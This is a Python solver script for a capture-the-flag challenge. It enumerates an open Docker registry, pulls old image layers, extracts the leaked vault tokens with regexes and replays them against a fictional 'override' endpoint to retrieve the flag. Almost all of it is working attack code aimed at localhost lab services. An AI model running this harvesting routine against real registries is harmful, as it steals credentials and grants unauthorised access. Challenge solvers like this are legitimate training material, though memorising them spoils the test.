#!/usr/bin/env python3
"""
Automated Solver for D27 — Private Container Registry
Enumerates OCI / Docker Registry v2 API, downloads historical layer blobs,
recovers the purged vault configuration credentials, authenticates to the internal
Orbital Vault daemon, and retrieves the flag.
"""

import argparse
import gzip
import io
import json
import re
import sys
import tarfile
import urllib.request
import urllib.error
import subprocess

def query_http_json(url: str, headers: dict = None) -> dict:
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=10) as response:
        return json.loads(response.read().decode("utf-8"))

def download_blob(url: str) -> bytes:
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=15) as response:
        return response.read()

def solve_via_direct_http(registry_url: str = "http://127.0.0.1:8080", vault_url: str = "http://127.0.0.1:8080") -> str:
    print(f"[*] Connecting to Registry at {registry_url}...")
    
    # 1. Enumerate catalog
    catalog = query_http_json(f"{registry_url}/v2/_catalog")
    repos = catalog.get("repositories", [])
    print(f"[+] Discovered repositories: {repos}")
    
    target_repo = "latveria/orbital-sentinel"
    if target_repo not in repos:
        raise ValueError(f"Target repository '{target_repo}' not found in catalog {repos}")

    # 2. Enumerate tags
    tags_data = query_http_json(f"{registry_url}/v2/{target_repo}/tags/list")
    tags = tags_data.get("tags", [])
    print(f"[+] Tags in {target_repo}: {tags}")

    # 3. Iterate over tags and inspect manifests & layer blobs
    recovered_secret = None
    recovered_caller = None
    recovered_action = None

    for tag in tags:
        print(f"[*] Inspecting manifest for tag '{tag}'...")
        manifest = query_http_json(
            f"{registry_url}/v2/{target_repo}/manifests/{tag}",
            headers={"Accept": "application/vnd.docker.distribution.manifest.v2+json"}
        )
        layers = manifest.get("layers", [])
        print(f"    -> Found {len(layers)} layers in tag '{tag}'")

        for idx, layer in enumerate(layers):
            digest = layer.get("digest")
            print(f"    [*] Checking layer {idx+1}/{len(layers)}: {digest[:20]}...")
            blob_bytes = download_blob(f"{registry_url}/v2/{target_repo}/blobs/{digest}")

            # Inspect tar.gz contents
            try:
                with gzip.GzipFile(fileobj=io.BytesIO(blob_bytes), mode="rb") as gz:
                    with tarfile.open(fileobj=gz, mode="r:*") as tar:
                        for member in tar.getmembers():
                            if "vault" in member.name.lower() or "secret" in member.name.lower() or "orbital_vault" in member.name:
                                print(f"[!] HISTORICAL SECRET FILE FOUND: '{member.name}' in tag '{tag}', layer {digest}")
                                f = tar.extractfile(member)
                                if f:
                                    content = f.read().decode("utf-8", errors="ignore")
                                    print(f"[+] File Content:\n{content}")
                                    
                                    tok_m = re.search(r"LATVERIAN_INTERNAL_TOKEN\s*=\s*([a-zA-Z0-9_\-]+)", content)
                                    caller_m = re.search(r"LATVERIAN_CALLER_ID\s*=\s*([a-zA-Z0-9_\-]+)", content)
                                    action_m = re.search(r"LATVERIAN_GATEWAY_ACTION\s*=\s*([a-zA-Z0-9_\-]+)", content)

                                    if tok_m:
                                        recovered_secret = tok_m.group(1)
                                    if caller_m:
                                        recovered_caller = caller_m.group(1)
                                    if action_m:
                                        recovered_action = action_m.group(1)
            except Exception:
                continue

    if not recovered_secret:
        raise ValueError("Failed to recover historical secret from registry layers!")

    print(f"\n[+] Successfully recovered credentials:")
    print(f"    Token:  {recovered_secret}")
    print(f"    Caller: {recovered_caller}")
    print(f"    Action: {recovered_action}")

    # 4. Authenticate to Internal Vault Service
    print(f"\n[*] Authenticating against internal vault service at {vault_url}/api/v1/vault/override...")
    req_body = json.dumps({
        "token": recovered_secret,
        "caller": recovered_caller or "orbital_defense_service_master",
        "action": recovered_action or "OVERRIDE_DEFENSE_GRID"
    }).encode("utf-8")

    req = urllib.request.Request(
        f"{vault_url}/api/v1/vault/override",
        data=req_body,
        headers={
            "Content-Type": "application/json",
            "X-Latverian-Token": recovered_secret,
            "X-Caller-ID": recovered_caller or "orbital_defense_service_master",
            "X-Gateway-Action": recovered_action or "OVERRIDE_DEFENSE_GRID"
        },
        method="POST"
    )

    with urllib.request.urlopen(req, timeout=10) as response:
        res_data = json.loads(response.read().decode("utf-8"))
        print(f"[+] Response from Vault daemon:\n{json.dumps(res_data, indent=2)}")
        flag = res_data.get("flag")
        if not flag:
            raise ValueError(f"Flag not found in response: {res_data}")
        print(f"\n========================================================")
        print(f"[+] SOLVE SUCCESSFUL! Flag: {flag}")
        print(f"========================================================\n")
        return flag

def solve_via_container_exec(container_name: str = "d27-test-runner") -> str:
    print(f"[*] Running solver inside container '{container_name}'...")
    inside_script = """
import urllib.request, json, gzip, io, tarfile, re

registry_url = 'http://127.0.0.1:5000'
vault_url = 'http://127.0.0.1:8080'

cat_req = urllib.request.Request(registry_url + '/v2/_catalog')
cat = json.loads(urllib.request.urlopen(cat_req).read().decode('utf-8'))
repo = 'latveria/orbital-sentinel'

tags_req = urllib.request.Request(f'{registry_url}/v2/{repo}/tags/list')
tags_data = json.loads(urllib.request.urlopen(tags_req).read().decode('utf-8'))

token, caller, action = None, None, None

for tag in tags_data.get('tags', []):
    man_req = urllib.request.Request(f'{registry_url}/v2/{repo}/manifests/{tag}', headers={'Accept': 'application/vnd.docker.distribution.manifest.v2+json'})
    man = json.loads(urllib.request.urlopen(man_req).read().decode('utf-8'))
    for l in man.get('layers', []):
        blob_req = urllib.request.Request(f'{registry_url}/v2/{repo}/blobs/' + l['digest'])
        b = urllib.request.urlopen(blob_req).read()
        try:
            with gzip.GzipFile(fileobj=io.BytesIO(b)) as gz:
                with tarfile.open(fileobj=gz) as tar:
                    for m in tar.getmembers():
                        if 'orbital_vault' in m.name or 'vault' in m.name:
                            f = tar.extractfile(m).read().decode('utf-8', errors='ignore')
                            tok_m = re.search(r'LATVERIAN_INTERNAL_TOKEN\s*=\s*([a-zA-Z0-9_\-]+)', f)
                            call_m = re.search(r'LATVERIAN_CALLER_ID\s*=\s*([a-zA-Z0-9_\-]+)', f)
                            act_m = re.search(r'LATVERIAN_GATEWAY_ACTION\s*=\s*([a-zA-Z0-9_\-]+)', f)
                            if tok_m:
                                token = tok_m.group(1)
                            if call_m:
                                caller = call_m.group(1)
                            if act_m:
                                action = act_m.group(1)
        except Exception:
            pass

post_data = json.dumps({'token': token, 'caller': caller, 'action': action}).encode('utf-8')
v_req = urllib.request.Request(vault_url + '/api/v1/vault/override', data=post_data, headers={'Content-Type': 'application/json', 'X-Latverian-Token': token})
resp = json.loads(urllib.request.urlopen(v_req).read().decode('utf-8'))
print(resp.get('flag', ''))
"""
    cmd = ["docker", "exec", "-u", "developer", container_name, "python3", "-c", inside_script]
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if res.returncode != 0:
        raise RuntimeError(f"Solver container exec failed:\n{res.stderr}\n{res.stdout}")
    flag = res.stdout.strip().split("\n")[-1]
    print(f"[+] Flag retrieved: {flag}")
    return flag

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D27 Private Container Registry Solver")
    parser.add_argument("--registry-url", default="http://127.0.0.1:8081", help="Registry URL (via port 80/8081)")
    parser.add_argument("--vault-url", default="http://127.0.0.1:8081", help="Vault URL")
    parser.add_argument("--container", default="27-private-container-registry", help="Docker container name for local test")
    parser.add_argument("--mode", choices=["http", "container"], default="http", help="Execution mode")
    args = parser.parse_args()

    if args.mode == "container":
        solve_via_container_exec(args.container)
    else:
        solve_via_direct_http(args.registry_url, args.vault_url)
